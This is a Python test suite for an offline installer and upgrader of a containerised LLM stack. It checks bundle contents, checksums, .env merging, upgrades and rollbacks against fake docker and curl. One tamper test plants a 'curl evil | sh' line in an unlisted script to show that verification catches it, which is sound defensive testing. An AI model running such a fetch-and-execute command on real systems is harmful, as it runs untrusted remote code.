"""
deploy/scripts/make-installer.sh and installer.sh: the offline bundle and the
installer's commands, against fake docker, podman and curl (support.py,
fake_engine.py, fake_curl.py). A small git history stands for the releases:
v5.2.0 tagged, then this release, 9.9.9.
"""
from __future__ import annotations

import json
import os
import shutil
import subprocess
import tarfile
import unittest
from pathlib import Path

from support import COMPOSE, Sandbox

SERVICES = "traefik\nweb\napp\npostgres\nlitellm\nargus\ncpu-temp-exporter\n"
THIRD_PARTY = ["traefik:v3.6.7", "pgvector/pgvector:0.8.0-pg16", "ghcr.io/berriai/litellm:main-stable", "python:3.13-slim",
               "ghcr.io/ggml-org/llama.cpp:server-cuda"]
# What compose names with make-installer's release.yml on top: the release's own by version.
IMAGES_NEW = "\n".join(THIRD_PARTY + ["arena-web:9.9.9", "arena-app:9.9.9", "arena-argus:9.9.9"])
# 5.2.0's compose file: one more key it needs, a file this release drops, one this release changes.
# A GPU service (llamacpp), which this host leaves out (FAKE_SERVICES has it not).
COMPOSE = COMPOSE.replace("volumes:\n", "  llamacpp:\n    image: ghcr.io/ggml-org/llama.cpp:server-cuda\nvolumes:\n", 1)
# And one the release builds that runs only when asked for (laya).
COMPOSE = COMPOSE.replace("volumes:\n", "  laya:\n    build: ./services/laya\n    profiles: [laya]\nvolumes:\n", 1)
COMPOSE_OLD = COMPOSE.replace("name: arena\n", "name: arena\n# 5.2.0\n")
COMPOSE_NEW = COMPOSE.replace("    container_name: app\n", "    container_name: app\n    environment: { NEW_KEY: \"${NEW_KEY:?set NEW_KEY}\", APP_KEY: \"${APP_KEY:?}\" }\n")
ENV_EXAMPLE_OLD = "DOMAIN=llm.localhost\nADMIN_EMAIL=admin@example.com\nMODELS_DIR=./models\nMODEL=org/repo:Q4\nADMIN_PASSWORD=\nAPP_KEY=\nDB_PASSWORD=\nGATEWAY_KEY=\nENGINE_KEY=\nARGUS_KEY=\n"
ENV_EXAMPLE_NEW = ENV_EXAMPLE_OLD + "# A new setting\nNEW_SETTING=on\nNEW_KEY=\n# HTTP_PORT=8080\n"
OLD_ENV = ("DOMAIN=old.example\nADMIN_EMAIL=me@old.example\nMODELS_DIR=./models\nMODEL=lib/model.gguf\nADMIN_PASSWORD=old-admin-pass\n"
           "APP_KEY=old-app-key\nDB_PASSWORD=old-db\nGATEWAY_KEY=sk-old\nENGINE_KEY=old-engine\nARGUS_KEY=old-argus\nOLD_THING=1\n")


def git(repo: Path, *args: str) -> None:
    subprocess.run(["git", "-c", "user.name=t", "-c", "user.email=t@t", "-C", str(repo), *args], check=True, capture_output=True)


class Release:
    """A repository with v5.2.0 tagged and 9.9.9 at HEAD, its images in a fake store, and its bundle."""

    def __init__(self, *make_args: str):
        self.s = s = Sandbox(curl=True)
        self.repo = s.repo
        s.write("docker-compose.yml", COMPOSE_OLD)
        s.write(".env.example", ENV_EXAMPLE_OLD)
        s.write("config/litellm.yaml", "model_list: []\n")
        s.write("config/traefik/routes.yml", "http: {}\n")
        s.write("config/dropped.yml", "old: 1\n")
        s.write("config/edited.yml", "shipped: 1\n")
        s.write("certs/README.md", "certificates\n")
        (self.repo / "VERSION").write_text("5.2.0\n")
        git(self.repo, "init", "-q")
        git(self.repo, "add", "-A")
        git(self.repo, "commit", "-q", "-m", "5.2.0")
        git(self.repo, "tag", "v5.2.0")
        self.old = s.dir / "old-deploy"
        shutil.copytree(s.deploy, self.old)
        s.write("docker-compose.yml", COMPOSE_NEW)
        s.write(".env.example", ENV_EXAMPLE_NEW)
        (s.deploy / "config" / "dropped.yml").unlink()
        s.write("config/edited.yml", "shipped: 2\n")
        s.write("config/added.yml", "new: 1\n")
        s.write("docker-compose.override.yml", "services: {}\n")  # the packing host's: never shipped
        s.write("untracked.txt", "not in git\n")
        (self.repo / "VERSION").write_text("9.9.9\n")
        s.write("LICENSE.md", "AGPL\n", base=self.repo)
        s.write("LICENSING.md", "licensing\n", base=self.repo)
        s.write("docs/deployment.md", "# Deploying\n", base=self.repo)
        s.write("docs/plan.md", "# Plans\n", base=self.repo)
        s.write("dist/code-arena-9.9.9-linux-x64.tar.gz", "code arena\n", base=self.repo)
        s.write("packs/python.arguspack", "a pack\n", base=self.repo)
        git(self.repo, "add", "-A", ":!deploy/untracked.txt", ":!deploy/docker-compose.override.yml")
        git(self.repo, "commit", "-q", "-m", "9.9.9")
        self.state = s.dir / "engine.json"
        # The third-party images, and the release's own as compose built them (latest).
        refs = THIRD_PARTY + ["arena-app:latest", "arena-web:latest", "arena-argus:latest", "arena-laya:latest"]
        self.state.write_text(json.dumps({"images": {r: f"{i:064x}" for i, r in enumerate(refs, start=1)}}))
        s.env = {"FAKE_STATE": str(self.state), "FAKE_SERVICES": SERVICES,
                 "FAKE_COMPOSE_VOLUMES": "postgres\nengine\nargus\n"}
        self.dist = self.repo / "dist"
        self.made = s.run("make-installer.sh", *make_args)
        self.run_file = self.dist / "argus-arena-9.9.9-offline.run"
        self.bundle = s.dir / "unpacked"

    def store(self) -> dict:
        return json.loads(self.state.read_text())

    def unpack(self) -> Path:
        """The bundle, unpacked once (sh RUN --extract)."""
        if not (self.bundle / "argus-arena-9.9.9").is_dir():
            self.bundle.mkdir(exist_ok=True)
            r = subprocess.run(["sh", str(self.run_file), "--extract", str(self.bundle)], capture_output=True, text=True,
                               env=self.env(), timeout=120)
            assert r.returncode == 0, r.stdout + r.stderr
        return self.bundle / "argus-arena-9.9.9"

    def env(self, extra: dict[str, str] | None = None) -> dict[str, str]:
        env = {k: v for k, v in os.environ.items() if not k.startswith(("COMPOSE_", "FAKE_"))}
        env.update({"PATH": f"{self.s.bin}:{env.get('PATH', '/usr/bin:/bin')}", "FAKE_LOG": str(self.s.log), "TMPDIR": str(self.s.dir)})
        env.update(self.s.env)
        env.update(extra or {})
        return env

    def run(self, *args: str, extra: dict[str, str] | None = None, via_run: bool = False) -> subprocess.CompletedProcess:
        """installer.sh ARGS, from the unpacked bundle (or the .run itself)."""
        cmd = ["sh", str(self.run_file), *args] if via_run else ["bash", str(self.unpack() / "installer.sh"), *args]
        return subprocess.run(cmd, cwd=self.s.dir, env=self.env(extra), capture_output=True, text=True, timeout=300, stdin=subprocess.DEVNULL)

    def calls(self) -> list[list[str]]:
        return self.s.calls()


class BundleTests(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.r = Release("--packs")

    @classmethod
    def tearDownClass(cls):
        cls.r.s.cleanup()

    def members(self, part: str) -> list[str]:
        """The names in the .run's small (head) or big (body) tar."""
        data = self.r.run_file.read_bytes()
        header = data[: data.index(b"\nHEAD_BYTES=")]
        start = int(header.split(b"HEAD_START=")[1].split()[0])
        head = int(data.split(b"\nHEAD_BYTES=")[1].split()[0])
        chunk = data[start:start + head] if part == "head" else data[start + head:]
        import io
        with tarfile.open(fileobj=io.BytesIO(chunk)) as tar:
            return tar.getnames()

    def test_A_release_is_one_file_and_its_checksum(self):
        self.assertEqual(self.r.made.returncode, 0, self.r.made.stdout + self.r.made.stderr)
        self.assertTrue(os.access(self.r.run_file, os.X_OK))
        r = subprocess.run(["sha256sum", "-c", self.r.run_file.name + ".sha256"], cwd=self.r.dist, capture_output=True, text=True)
        self.assertEqual(r.returncode, 0, r.stdout + r.stderr)
        self.assertTrue(self.r.run_file.read_bytes().startswith(b"#!/bin/sh\n"))

    def test_The_installer_and_what_it_plans_with_come_first(self):
        head = self.members("head")
        self.assertEqual(head[:3], ["argus-arena-9.9.9/installer.sh", "argus-arena-9.9.9/MANIFEST", "argus-arena-9.9.9/SHA256SUMS"])
        for name in ("images/IMAGES", "images/RELEASE", "deploy/docker-compose.yml", "docs/deployment.md", "known/5.2.0.sha256", "LICENSE.md"):
            self.assertIn(f"argus-arena-9.9.9/{name}", head)
        body = self.members("body")
        self.assertTrue(all(n.startswith("argus-arena-9.9.9/") for n in body))
        self.assertTrue(any(n.endswith(".tar.gz") and "/images/" in n for n in body))
        self.assertFalse(set(head) & set(body))

    def test_The_bundle_holds_the_release_and_nothing_of_the_host(self):
        b = self.r.unpack()
        manifest = (b / "MANIFEST").read_text()
        for line in ("format: argus-arena-offline 1", "version: 9.9.9", "upgrades-from: 5.2.0", "engine: docker", "packs: 1", "code-arena: 1"):
            self.assertIn(line + "\n", manifest)
        self.assertRegex(manifest, r"commit: [0-9a-f]{7}")
        self.assertEqual((b / "installer.sh").read_text(), (self.r.s.deploy / "scripts" / "installer.sh").read_text())
        release = dict(line.split("\t") for line in (b / "images" / "RELEASE").read_text().splitlines())
        self.assertEqual(release, {"web": "arena-web:9.9.9", "app": "arena-app:9.9.9", "argus": "arena-argus:9.9.9", "laya": "arena-laya:9.9.9"})
        rows = [line.split("\t") for line in (b / "images" / "IMAGES").read_text().splitlines()]
        self.assertEqual(sorted(r[0] for r in rows), sorted(IMAGES_NEW.split() + ["arena-laya:9.9.9"]))
        for ref, file, _, size, raw in rows:
            self.assertTrue(file.endswith(".tar.gz"), file)
            self.assertEqual((b / "images" / file).read_bytes()[:2], b"\x1f\x8b")
            self.assertEqual(int(size), (b / "images" / file).stat().st_size)
            self.assertGreater(int(raw), 0)
        deploy = {str(p.relative_to(b / "deploy")) for p in (b / "deploy").rglob("*") if p.is_file()}
        self.assertIn("config/added.yml", deploy)
        self.assertIn("scripts/installer.sh", deploy)
        for left in (".env", "docker-compose.override.yml", "untracked.txt", "config/dropped.yml"):
            self.assertNotIn(left, deploy)
        self.assertTrue((b / "docs" / "deployment.md").is_file())
        self.assertFalse((b / "docs" / "plan.md").exists())
        self.assertTrue((b / "code-arena" / "code-arena-9.9.9-linux-x64.tar.gz").is_file())
        self.assertTrue((b / "packs" / "python.arguspack").is_file())
        known = (b / "known" / "5.2.0.sha256").read_text()
        self.assertIn("  config/dropped.yml\n", known)
        self.assertIn("  docker-compose.yml\n", known)
        r = subprocess.run(["sha256sum", "-c", "--strict", "--quiet", "SHA256SUMS"], cwd=b, capture_output=True, text=True)
        self.assertEqual(r.returncode, 0, r.stdout + r.stderr)

    def test_The_version_tags_it_made_are_gone_afterwards(self):
        images = self.r.store()["images"]
        self.assertNotIn("arena-app:9.9.9", images)
        self.assertIn("arena-app:latest", images)
        self.assertFalse(any(c[1:2] == ["pull"] for c in self.r.calls()))


class MakeInstallerArgumentTests(unittest.TestCase):
    def setUp(self):
        self.s = Sandbox()
        (self.s.repo / "VERSION").write_text("9.9.9\n")
        self.s.env = {"FAKE_CONFIG": COMPOSE, "FAKE_SERVICES": SERVICES}

    def tearDown(self):
        self.s.cleanup()

    def test_Arguments_are_checked(self):
        for args, message in [
            (["--fast"], "unknown option"),
            (["--version", "five"], "not a version"),
            (["--version", "5.1.0"], "older than 5.2.0"),
            (["--leave-out", "nope"], "--leave-out nope: no such service"),
            (["--project", "Bad Name"], "--project"),
        ]:
            r = self.s.run("make-installer.sh", *args)
            self.assertEqual(r.returncode, 2, (args, r.stdout, r.stderr))
            self.assertIn(message, r.stderr, args)

    def test_A_release_image_that_is_not_built_stops_it(self):
        state = self.s.dir / "engine.json"
        state.write_text(json.dumps({"images": {}}))
        self.s.env["FAKE_STATE"] = str(state)
        r = self.s.run("make-installer.sh")
        self.assertEqual(r.returncode, 1)
        self.assertRegex(r.stderr, r"arena-(app|web) is not on this host: build it first")
        self.assertFalse((self.s.repo / "dist").exists() and any((self.s.repo / "dist").glob("*.run")))

    def test_A_dry_run_writes_and_saves_nothing(self):
        r = self.s.run("make-installer.sh", "--dry-run", "--leave-out", "argus")
        self.assertEqual(r.returncode, 0, r.stderr)
        self.assertIn("Would make", r.stdout)
        self.assertIn("left out: argus", r.stdout)
        self.assertFalse((self.s.repo / "dist").exists())
        self.assertFalse(self.s.called("save") or self.s.called("tag"))


class InstallerTests(unittest.TestCase):
    """installer.sh's commands, each test on a fresh copy of one release's bundle."""

    @classmethod
    def setUpClass(cls):
        cls.r = Release()
        cls.r.unpack()
        cls.pristine = json.loads(cls.r.state.read_text())

    @classmethod
    def tearDownClass(cls):
        cls.r.s.cleanup()

    def setUp(self):
        self.r.state.write_text(json.dumps(self.pristine))
        self.r.s.log.write_text("")
        self.dir = self.r.s.dir / f"inst-{self._testMethodName}"

    def tearDown(self):
        shutil.rmtree(self.dir, ignore_errors=True)
        shutil.rmtree(self.r.s.dir / "final", ignore_errors=True)

    # ---------------------------------------------------------------- helpers

    def install(self, *extra: str, code: int = 0, gitlab: bool = True) -> subprocess.CompletedProcess:
        token = self.r.s.dir / "gitlab-token"
        token.write_text("glpat-a-token-for-the-test\n")
        more = ["--gitlab-url", "https://gitlab.test", "--gitlab-token-file", str(token)] if gitlab else []
        r = self.r.run("install", "--dir", str(self.dir), "--yes", "--cpu-only", "--skip-requirements", "--timeout", "5s",
                       "--domain", "arena.test", "--https-port", "18443", "--http-port", "18080", *more, *extra)
        self.assertEqual(r.returncode, code, r.stdout + r.stderr)
        return r

    def old_install(self, version_file: bool = False, running: bool = True) -> Path:
        """A 5.2.0 installation the old way (airgap.sh load, compose up): no record of this installer."""
        deploy = self.dir / "deploy"
        shutil.copytree(self.r.old, deploy)
        (deploy / ".env").write_text(OLD_ENV)
        (deploy / ".env").chmod(0o600)
        (deploy / "config" / "edited.yml").write_text("shipped: 1\nmine: yes\n")
        (deploy / "config" / "mine.yml").write_text("my own\n")
        (deploy / "certs" / "tls.key").write_text("KEY\n")
        if version_file:
            (self.dir / "VERSION").write_text("5.2.0\n")
        if running:
            self.compose_up(deploy)
        return deploy

    def compose_up(self, deploy: Path, project: str = "arena") -> None:
        subprocess.run(["docker", "compose", "up", "-d"], cwd=deploy, env=self.r.env({"COMPOSE_PROJECT_NAME": project}), check=True)

    def output(self, r: subprocess.CompletedProcess) -> str:
        return r.stdout + r.stderr

    def logs(self) -> str:
        return "".join(p.read_text() for p in (self.dir / ".arena-install" / "logs").glob("*.log"))

    def containers(self) -> list[dict]:
        return self.r.store()["containers"]

    # ------------------------------------------------------------- arguments

    def test_Arguments_are_checked(self):
        for args, message in [
            ([], "say what to do"),
            (["setup"], "unknown command: setup"),
            (["install", "--fast"], "unknown option: --fast"),
            (["install", "--purge"], "--purge is for remove"),
            (["upgrade", "--cpu-only"], "--cpu-only is for install"),
            (["remove", "--confirm", "PURGE"], "--confirm is for --purge"),
            (["install", "--https-port", "70000"], "a port is a number"),
            (["install", "--timeout", "soon"], "--timeout is minutes"),
            (["install", "--project", "Arena"], "--project"),
            (["install", "--dir"], "--dir needs a value"),
        ]:
            r = self.r.run(*args)
            self.assertEqual(r.returncode, 2, (args, r.stdout, r.stderr))
            self.assertIn(message, r.stderr, args)
        r = self.r.run("help")
        self.assertEqual(r.returncode, 0)
        self.assertIn("Exit codes:", r.stdout)

    def test_No_questions_without_a_terminal_or_yes(self):
        r = self.r.run("install", "--dir", str(self.dir), "--cpu-only")
        self.assertEqual(r.returncode, 3, self.output(r))
        self.assertIn("no terminal to ask the domain, ports and models", r.stderr)
        self.assertFalse(self.dir.exists())

    # ------------------------------------------------------------- dry runs

    def test_A_dry_run_install_from_the_run_file_changes_nothing(self):
        r = self.r.run("install", "--dir", str(self.dir), "--yes", "--cpu-only", "--dry-run", via_run=True)
        self.assertEqual(r.returncode, 0, self.output(r))
        out = r.stdout
        self.assertIn("dry run: nothing is done", out)
        self.assertIn("the small ones: the rest is checked when it is unpacked", out)
        self.assertIn("would  load 9 images", out)
        self.assertIn("would  write docker-compose.override.yml: llamacpp argus left out; the speech server offline", out)
        self.assertIn("no GitLab given (--gitlab-url, --gitlab-token-file): Argus is left out", out)
        self.assertFalse(self.dir.exists())
        mutating = {"load", "tag", "run", "rm", "rmi", "save"}
        self.assertFalse([c for c in self.r.calls() if c[1:2] and c[1] in mutating], self.r.calls())
        self.assertFalse([c for c in self.r.calls() if c[1:2] == ["compose"] and "up" in c])
        self.assertEqual(list(self.r.dist.glob(".argus-arena-unpack.*")), [])

    def test_A_dry_run_upgrade_lists_files_and_env_keys(self):
        self.old_install(version_file=True)
        before = self.r.store()
        r = self.r.run("upgrade", "--dir", str(self.dir), "--dry-run")
        self.assertEqual(r.returncode, 0, self.output(r))
        out = r.stdout
        self.assertIn("from 5.2.0 (" + str(self.dir / "VERSION") + ") to 9.9.9", out)
        self.assertIn("would  update docker-compose.yml", out)
        self.assertIn("would  update config/edited.yml, which was changed here: that copy kept as config/edited.yml.before-9.9.9", out)
        self.assertIn("would  add config/added.yml", out)
        self.assertIn("would  remove config/dropped.yml: not in 9.9.9 (it is 5.2.0's, unchanged)", out)
        self.assertIn("kept config/mine.yml: not in 9.9.9; yours", out)
        self.assertIn("would  add to .env: NEW_SETTING=on (the default)", out)
        self.assertIn("would  add to .env: NEW_KEY (a new secret, generated)", out)
        self.assertIn(".env: not read by 9.9.9, kept: OLD_THING", out)
        self.assertEqual(self.r.store(), before)
        self.assertFalse((self.dir / ".arena-install").exists())
        self.assertNotIn("NEW_KEY", (self.dir / "deploy" / ".env").read_text())

    # ------------------------------------------------------- the version gate

    def test_The_version_gate(self):
        deploy = self.old_install(running=False)
        for installed, code, message in [
            ("5.1.0", 3, "5.1.0 is installed"),
            ("5.2.0-rc1", 3, "this bundle upgrades 5.2.0 or newer"),
            ("10.0.0", 3, "newer than this bundle's 9.9.9"),
            ("9.9.9", 0, "nothing to upgrade"),
            ("five", 3, "is not one this installer reads"),
        ]:
            (self.dir / "VERSION").write_text(installed + "\n")
            r = self.r.run("upgrade", "--dir", str(self.dir), "--yes")
            self.assertEqual(r.returncode, code, (installed, self.output(r)))
            self.assertIn(message, self.output(r), installed)
        (self.dir / "VERSION").unlink()
        r = self.r.run("upgrade", "--dir", str(self.dir), "--yes")
        self.assertEqual(r.returncode, 3, self.output(r))
        self.assertIn("the version installed is not known", r.stderr)
        self.assertIn("Start the stack", r.stderr)
        self.assertEqual((deploy / ".env").read_text(), OLD_ENV)
        self.assertFalse(any(c[1:2] in (["load"], ["tag"]) for c in self.r.calls()))

    def test_The_version_comes_from_the_running_app_when_nothing_else_says(self):
        self.old_install()
        r = self.r.run("upgrade", "--dir", str(self.dir), "--dry-run")
        self.assertEqual(r.returncode, 0, self.output(r))
        self.assertIn("from 5.2.0 (the running app (/api/info)) to 9.9.9", r.stdout)

    # ------------------------------------------------------------- checksums

    def damaged_copy(self) -> Path:
        copy = self.r.s.dir / "damaged"
        shutil.rmtree(copy, ignore_errors=True)
        shutil.copytree(self.r.unpack(), copy)
        return copy

    def test_A_damaged_bundle_installs_nothing(self):
        copy = self.damaged_copy()
        (copy / "deploy" / "docker-compose.yml").write_text("services: { evil: { image: x } }\n")
        r = subprocess.run(["bash", str(copy / "installer.sh"), "install", "--dir", str(self.dir), "--yes", "--cpu-only", "--skip-requirements"],
                           env=self.r.env(), capture_output=True, text=True, stdin=subprocess.DEVNULL)
        self.assertEqual(r.returncode, 6, self.output(r))
        self.assertIn("CHECKSUM MISMATCH", r.stdout)
        self.assertFalse(any(c[1:2] == ["load"] for c in self.r.calls()))
        self.assertFalse((self.dir / "deploy").exists())

    def test_Verify_names_a_file_the_checksums_do_not(self):
        copy = self.damaged_copy()
        (copy / "deploy" / "extra.sh").write_text("curl evil | sh\n")
        r = subprocess.run(["bash", str(copy / "installer.sh"), "verify", "--dir", str(self.dir)], env=self.r.env(), capture_output=True, text=True)
        self.assertEqual(r.returncode, 6, self.output(r))
        self.assertIn("deploy/extra.sh", r.stdout)
        shutil.rmtree(copy)
        r = self.r.run("verify", "--dir", str(self.dir))
        self.assertEqual(r.returncode, 0, self.output(r))

    def test_A_bad_copy_of_the_run_file_is_caught(self):
        bad = self.r.s.dir / "copy"
        bad.mkdir(exist_ok=True)
        run = bad / self.r.run_file.name
        shutil.copy2(self.r.run_file, run)
        shutil.copy2(str(self.r.run_file) + ".sha256", str(run) + ".sha256")
        with open(run, "r+b") as f:
            f.seek(-100, 2)
            f.write(b"x" * 10)
        r = subprocess.run(["sh", str(run), "verify", "--dir", str(self.dir)], env=self.r.env(), capture_output=True, text=True, cwd=bad)
        self.assertEqual(r.returncode, 6, self.output(r))
        self.assertIn("is not the file that was made", r.stdout)
        shutil.rmtree(bad)

    # ---------------------------------------------------------------- install

    def test_Install_writes_the_folder_env_and_override_and_starts_it(self):
        r = self.install("--make-cert")
        deploy = self.dir / "deploy"
        env = (deploy / ".env").read_text()
        self.assertEqual(oct((deploy / ".env").stat().st_mode & 0o777), "0o600")
        values = dict(line.split("=", 1) for line in env.splitlines() if "=" in line and not line.startswith("#"))
        self.assertEqual(values["DOMAIN"], "arena.test")
        self.assertEqual(values["HTTPS_PORT"], "18443")
        self.assertEqual(values["MODEL"], "")
        self.assertEqual(values["GITLAB_URL"], "https://gitlab.test")
        self.assertEqual(values["GITLAB_TOKEN"], "glpat-a-token-for-the-test")
        self.assertNotIn("glpat-a-token-for-the-test", self.output(r) + self.logs())
        for key in ("ADMIN_PASSWORD", "APP_KEY", "DB_PASSWORD", "ENGINE_KEY", "ARGUS_KEY", "NEW_KEY"):
            self.assertGreaterEqual(len(values[key]), 24, key)
            self.assertNotIn(values[key], self.output(r) + self.logs(), key)
        self.assertTrue(values["GATEWAY_KEY"].startswith("sk-"))
        self.assertIn("not printed, as this run has no terminal", r.stdout)
        override = (deploy / "docker-compose.override.yml").read_text()
        self.assertIn("  llamacpp: { profiles: [off] }", override)
        self.assertNotIn("imagegen", override)  # not a service of this release
        self.assertIn('HF_HUB_OFFLINE: "1"', override)
        self.assertTrue((deploy / "certs" / "tls.crt").is_file())
        for f in ("docs/deployment.md", "LICENSE.md", "VERSION", "code-arena/code-arena-9.9.9-linux-x64.tar.gz", "packs"):
            self.assertTrue((self.dir / f).exists(), f)
        state = (self.dir / ".arena-install" / "state").read_text()
        self.assertIn("version=9.9.9\n", state)
        self.assertIn("status=installed\n", state)
        self.assertEqual(sorted(c["service"] for c in self.containers()), sorted(SERVICES.split()))
        app = next(c for c in self.containers() if c["service"] == "app")
        self.assertEqual(app["image_id"], self.r.store()["images"]["arena-app:9.9.9"])
        self.assertIn("ok     app: 9.9.9 (its own /api/info)", r.stdout)
        self.assertIn("Argus Arena 9.9.9 runs: https://arena.test:18443", r.stdout)
        # Third-party images that were here before: recorded so, and remove leaves them.
        rows = [line.split("\t") for line in (self.dir / ".arena-install" / "IMAGES").read_text().splitlines()]
        self.assertEqual([r_[2] for r_ in rows if r_[0] == "traefik:v3.6.7"], ["1"])
        self.assertEqual([r_[2] for r_ in rows if r_[0] == "arena-app:9.9.9"], ["0"])
        # Again: nothing breaks, nothing is loaded twice, .env kept.
        self.r.s.log.write_text("")
        r = self.install()
        self.assertEqual((deploy / ".env").read_text(), env)
        self.assertFalse(any(c[1:2] == ["load"] for c in self.r.calls()), "loaded again")

    def test_Without_a_GitLab_Argus_is_left_out_and_said_so(self):
        r = self.install(gitlab=False)
        override = (self.dir / "deploy" / "docker-compose.override.yml").read_text()
        self.assertIn("  argus: { profiles: [off] }", override)
        self.assertIn("Argus is left out", r.stdout)
        self.assertNotIn("argus", [c["service"] for c in self.containers()])
        r = self.r.run("install", "--dir", str(self.r.s.dir / "x"), "--yes", "--project", "other", "--gitlab-url", "https://gitlab.test")
        self.assertEqual(r.returncode, 3, self.output(r))
        self.assertIn("--gitlab-url needs its token", r.stderr)

    def test_An_upgrade_does_not_wait_for_a_service_that_was_down_before_it(self):
        self.old_install(version_file=True)
        store = self.r.store()
        next(c for c in store["containers"] if c["service"] == "argus")["state"] = "restarting"
        self.r.state.write_text(json.dumps(store))
        r = self.r.run("upgrade", "--dir", str(self.dir), "--yes", "--timeout", "3s", extra={"FAKE_DOWN": "argus"})
        self.assertEqual(r.returncode, 0, self.output(r))
        self.assertIn("not up before the upgrade: argus", r.stdout)
        self.assertIn("not up, as before the upgrade: argus: restarting", r.stdout)
        # Down after the upgrade but up before: that fails it.
        shutil.rmtree(self.dir)
        self.r.state.write_text(json.dumps(self.pristine))
        self.old_install(version_file=True)
        r = self.r.run("upgrade", "--dir", str(self.dir), "--yes", "--timeout", "3s", extra={"FAKE_DOWN": "web"})
        self.assertEqual(r.returncode, 5, self.output(r))
        self.assertIn("web: restarting", r.stdout)

    def test_Install_refuses_a_folder_or_project_that_has_an_installation(self):
        self.old_install()
        r = self.r.run("install", "--dir", str(self.dir), "--yes", "--cpu-only", "--skip-requirements")
        self.assertEqual(r.returncode, 3, self.output(r))
        self.assertIn("did not make: upgrade it", r.stderr)
        other = self.r.s.dir / "other"
        r = self.r.run("install", "--dir", str(other), "--yes", "--cpu-only", "--skip-requirements")
        self.assertEqual(r.returncode, 3, self.output(r))
        self.assertIn("a stack named arena runs", r.stderr)
        self.assertFalse(other.exists())

    def test_A_failed_requirement_stops_install_before_anything(self):
        r = self.r.run("install", "--dir", str(self.dir), "--yes", "--domain", "arena.test",
                       extra={"PATH": f"{self.r.s.bin}:/usr/bin:/bin", "FAKE_NO_GPU": "1"})
        self.assertEqual(r.returncode, 3, self.output(r))
        self.assertIn("no NVIDIA GPU", r.stdout)
        self.assertIn("--cpu-only", r.stdout)
        self.assertFalse(any(c[1:2] == ["load"] for c in self.r.calls()))

    # ---------------------------------------------------------------- upgrade

    def test_Upgrade_from_5_2_0_backs_up_updates_merges_and_runs_the_new_release(self):
        deploy = self.old_install()
        old_app = next(c for c in self.containers() if c["service"] == "app")["image_id"]
        r = self.r.run("upgrade", "--dir", str(self.dir), "--yes", "--timeout", "5s")
        self.assertEqual(r.returncode, 0, self.output(r))
        out = r.stdout
        # A backup first, with backup.sh, taken before anything changed.
        backups = sorted((deploy / "backups").glob("20*_*"))
        self.assertEqual(len(backups), 1, out)
        self.assertEqual((backups[0] / "RESULT").read_text().strip(), "ok")
        self.assertEqual((backups[0] / "config" / ".env").read_text(), OLD_ENV)
        self.assertIn("backup: " + str(backups[0]), out)
        # Files: the shipped ones updated, a changed one kept beside, a dropped one removed, the host's own kept.
        self.assertEqual((deploy / "docker-compose.yml").read_text(), COMPOSE_NEW)
        self.assertEqual((deploy / "config" / "edited.yml").read_text(), "shipped: 2\n")
        self.assertEqual((deploy / "config" / "edited.yml.before-9.9.9").read_text(), "shipped: 1\nmine: yes\n")
        self.assertFalse((deploy / "config" / "dropped.yml").exists())
        self.assertEqual((deploy / "config" / "mine.yml").read_text(), "my own\n")
        self.assertEqual((deploy / "certs" / "tls.key").read_text(), "KEY\n")
        # .env: the old values as they were, the new keys added, nothing removed.
        env = (deploy / ".env").read_text()
        self.assertTrue(env.startswith(OLD_ENV))
        self.assertIn("\nNEW_SETTING=on\n", env)
        new_key = [line for line in env.splitlines() if line.startswith("NEW_KEY=")][0].split("=", 1)[1]
        self.assertGreaterEqual(len(new_key), 32)
        self.assertNotIn(new_key, self.output(r) + self.logs())
        self.assertNotIn("old-app-key", self.output(r) + self.logs())
        self.assertEqual(oct((deploy / ".env").stat().st_mode & 0o777), "0o600")
        # The new release runs; the old images stay for a rollback.
        images = self.r.store()["images"]
        app = next(c for c in self.containers() if c["service"] == "app")
        self.assertEqual(app["image_id"], images["arena-app:9.9.9"])
        self.assertIn(old_app, [v for k, v in images.items() if k.startswith("arena-rollback:5.2.0-")])
        self.assertIn("Upgraded from 5.2.0 to 9.9.9", out)
        self.assertIn(".env: 2 key(s) added (NEW_SETTING NEW_KEY )", out)
        self.assertIn("version=9.9.9\n", (self.dir / ".arena-install" / "state").read_text())
        self.assertFalse((self.dir / ".arena-install" / "upgrade").exists())
        # Again: nothing to do.
        r = self.r.run("upgrade", "--dir", str(self.dir), "--yes")
        self.assertEqual(r.returncode, 0, self.output(r))
        self.assertIn("nothing to upgrade", r.stdout)

    def test_A_failed_upgrade_rolls_back_files_images_and_data(self):
        deploy = self.old_install()
        old_app = next(c for c in self.containers() if c["service"] == "app")["image_id"]
        r = self.r.run("upgrade", "--dir", str(self.dir), "--yes", "--timeout", "3s", extra={"FAKE_UNHEALTHY": "arena-app:9.9.9"})
        self.assertEqual(r.returncode, 4, self.output(r))
        out = r.stdout
        self.assertIn("The upgrade to 9.9.9 failed (above). Rolling back to 5.2.0.", out)
        self.assertIn("Rolled back: 5.2.0 runs again", out)
        # The files and .env as they were, nothing the upgrade added left behind.
        self.assertEqual((deploy / "docker-compose.yml").read_text(), COMPOSE_OLD)
        self.assertEqual((deploy / ".env").read_text(), OLD_ENV)
        self.assertEqual((deploy / "config" / "dropped.yml").read_text(), "old: 1\n")
        self.assertFalse((deploy / "config" / "added.yml").exists())
        self.assertFalse((deploy / "config" / "edited.yml.before-9.9.9").exists())
        # 5.2.0 had no VERSION beside deploy/; the upgrade's is gone again.
        self.assertFalse((self.dir / "VERSION").exists())
        # The old images, and the data of the backup (restored by backup.sh, after keeping what the failed one left).
        app = next(c for c in self.containers() if c["service"] == "app")
        self.assertEqual(app["image_id"], old_app)
        self.assertTrue(any("find /target -mindepth 1 -delete" in " ".join(c) for c in self.r.calls()))
        self.assertTrue(list((self.dir / ".arena-install" / "rollback" / "5.2.0" / "after-failed-upgrade").glob("20*")))
        self.assertFalse((self.dir / ".arena-install" / "upgrade").exists())

    def test_An_upgrade_cut_off_half_way_carries_on(self):
        self.old_install(version_file=True)
        r = self.r.run("upgrade", "--dir", str(self.dir), "--yes", "--timeout", "3s", extra={"FAKE_UP_FAIL": "1"})
        self.assertIn(r.returncode, (4, 5), self.output(r))
        # As if the run was killed after the backup: the record says where it was.
        state = self.dir / ".arena-install"
        (state / "upgrade").write_text(f"from=5.2.0\nto=9.9.9\nbackup={sorted((self.dir / 'deploy' / 'backups').glob('20*'))[0]}\nstarted=0\n")
        r = self.r.run("upgrade", "--dir", str(self.dir), "--yes", "--timeout", "5s")
        self.assertEqual(r.returncode, 0, self.output(r))
        self.assertIn("carrying on the upgrade from 5.2.0 that was interrupted", r.stdout)
        self.assertEqual(len(list((self.dir / "deploy" / "backups").glob("20*"))), 1, "a second backup was taken")

